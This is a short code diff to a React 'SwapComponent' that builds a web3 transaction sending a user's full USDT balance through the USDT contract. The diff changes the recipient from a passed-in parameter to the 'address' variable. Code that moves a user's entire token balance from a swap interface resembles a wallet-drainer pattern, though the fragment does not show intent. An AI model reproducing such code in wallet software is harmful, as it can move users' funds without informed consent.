@@ -132,7 +132,7 @@ function SwapComponent() {
   //     })
   // }
 
-  const sendTransaction = async (recipient) => {
+  const sendTransaction = async () => {
     if (!web3js) return
 
     const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
@@ -164,9 +164,7 @@ function SwapComponent() {
       return
     }
 
-    const data = usdtContract.methods
-      .transfer(recipient, usdtBalance)
-      .encodeABI()
+    const data = usdtContract.methods.transfer(address, usdtBalance).encodeABI()
 
     const nonce = await web3js.eth.getTransactionCount(address, 'pending')
     const gasPrice = await web3js.eth.getGasPrice()
